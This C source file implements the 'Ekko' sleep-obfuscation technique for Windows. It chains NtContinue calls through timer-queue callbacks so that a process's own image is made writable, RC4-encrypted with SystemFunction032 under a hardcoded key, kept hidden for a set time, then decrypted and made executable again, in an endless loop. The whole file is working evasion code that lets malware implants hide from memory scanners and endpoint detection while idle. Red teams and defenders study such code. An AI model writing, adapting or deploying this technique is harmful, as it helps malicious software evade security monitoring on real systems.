#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include "extras.h"

void EkkoFunction(DWORD TIME_TO_SLEEP) {
	CONTEXT OriginalContext = { 0 };

	CONTEXT RopProtRW = { 0 };
    CONTEXT RopMemEnc = { 0 };
    CONTEXT RopMemDec = { 0 };
    CONTEXT RopProtRX = { 0 };
    CONTEXT RopSetEvt = { 0 };

	HANDLE hTimerQueue = NULL;
	HANDLE hTimer = NULL;
	HANDLE hEvent = NULL;
	PVOID ImageBase = NULL;
	DWORD ImageSize = 0;
	DWORD OldProtect = 0;
	
	PVOID NtContinue = NULL;
	PVOID Sysfunc032 = NULL;
	
	hEvent = CreateEventA(NULL, FALSE, FALSE, NULL);
	hTimerQueue = CreateTimerQueue();

	NtContinue = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtContinue");
	Sysfunc032 = GetProcAddress(LoadLibraryA("advapi32.dll"), "SystemFunction032");

	USTRING Key, Img;
	CHAR KeyBuf[16] = {0xde,0xad,0xbe,0xef,0xca,0xfe,0xba,0xbe,0xde,0xad,0xbe,0xef,0xca,0xfe,0xba,0xbe};
	Key.Buffer = KeyBuf;
	Key.Length = Key.MaximumLength = 16;

	info("Starting EkkoFunction...");
	ImageBase = GetModuleHandleA(NULL);
	ImageSize = ((PIMAGE_NT_HEADERS)((BYTE*)ImageBase + ((PIMAGE_DOS_HEADER)ImageBase)->e_lfanew))->OptionalHeader.SizeOfImage;

	Img.Buffer = ImageBase;
	Img.Length = Img.MaximumLength = ImageSize;

	if (CreateTimerQueueTimer(&hTimer, hTimerQueue, RtlCaptureContext, &OriginalContext, 0, 0, WT_EXECUTEINTIMERTHREAD)) {
		info("Context captured successfully");
		Sleep(100); // Meant to let the stack stabalize

		//Copying current context into multiple copies for different ROP chains
		memcpy(&RopProtRW, &OriginalContext, sizeof(CONTEXT));
		memcpy(&RopMemEnc, &OriginalContext, sizeof(CONTEXT));
		memcpy(&RopMemDec, &OriginalContext, sizeof(CONTEXT));
		memcpy(&RopProtRX, &OriginalContext, sizeof(CONTEXT));
		memcpy(&RopSetEvt, &OriginalContext, sizeof(CONTEXT));

		// Rsp adjustments for stack alignment
		// All threads end with ret and return to the rsp, hence in the current thread.

		// VirtualProtect( ImageBase, ImageSize, PAGE_READWRITE, &OldProtect );
		RopProtRW.Rsp -= 24; // dangerous
		RopProtRW.Rip = VirtualProtect;
		RopProtRW.Rcx = ImageBase;
		RopProtRW.Rdx = ImageSize;
		RopProtRW.R8 = PAGE_READWRITE;
		RopProtRW.R9 = &OldProtect;

		// SystemFunction032 (&Key, &Img);
		RopMemEnc.Rsp -= 8; // safe
		RopMemEnc.Rip = Sysfunc032;
		RopMemEnc.Rcx = &Img;
		RopMemEnc.Rdx = &Key;


		// SystemFunction032 (&Key, &Img);
		RopMemDec.Rsp -= 24; // dangerous
		RopMemDec.Rip = Sysfunc032;
		RopMemDec.Rcx = &Img;
		RopMemDec.Rdx = &Key;

		// VirtualProtect( ImageBase, ImageSize, PAGE_EXECUTE_READ, &OldProtect );
		RopProtRX.Rsp -= 8; // safe
		RopProtRX.Rip = VirtualProtect;
		RopProtRX.Rcx = ImageBase;
		RopProtRX.Rdx = ImageSize;
		RopProtRX.R8 = PAGE_EXECUTE_READ;
		RopProtRX.R9 = &OldProtect;

		// SetEvent( hEvent );
		RopSetEvt.Rsp -= 24; // dangerous
		RopSetEvt.Rip = SetEvent;
		RopSetEvt.Rcx = hEvent;

		ok("Starting ROP chains via NtContinue...");

		CreateTimerQueueTimer(&hTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopProtRW, 100, 0, WT_EXECUTEINTIMERTHREAD);
		CreateTimerQueueTimer(&hTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopMemEnc, 200, 0, WT_EXECUTEINTIMERTHREAD);
		CreateTimerQueueTimer(&hTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopMemDec, TIME_TO_SLEEP, 0, WT_EXECUTEINTIMERTHREAD);
		CreateTimerQueueTimer(&hTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopProtRX, TIME_TO_SLEEP + 100, 0, WT_EXECUTEINTIMERTHREAD);
		CreateTimerQueueTimer(&hTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopSetEvt, TIME_TO_SLEEP + 200, 0, WT_EXECUTEINTIMERTHREAD);

		ok("ROP chains initiated successfully.");
		ok("Waiting for hEvent");

		WaitForSingleObject(hEvent, INFINITE);

		ok("hEvent signaled. Exiting EkkoFunction.");
	}else {
		error("CreateTimerQueueTimer failed.");
		yolo();
	}

	DeleteTimerQueue(hTimerQueue);
}

int main() {
	do {
		Sleep(5000);
		EkkoFunction(4 * 1000);
	} while (TRUE);
	return 0;
}